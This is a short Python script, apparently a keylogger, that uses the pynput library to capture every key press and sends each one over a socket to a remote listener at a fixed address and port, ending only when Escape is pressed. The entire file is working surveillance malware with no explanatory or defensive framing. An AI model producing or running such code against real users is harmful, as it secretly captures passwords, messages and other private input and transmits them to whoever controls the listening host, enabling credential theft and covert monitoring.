import pynput
from pynput.keyboard import Listener, Key
import socket

host = '192.168.0.101'
port = 9999

s = socket.socket()
s.connect((host, port))

def press(key):
    #print(key)
    s.send(str(key).encode())

def release(key):
    if key == Key.esc:
        return False

with Listener(on_press = press, on_release = release) as listener:
    listener.join()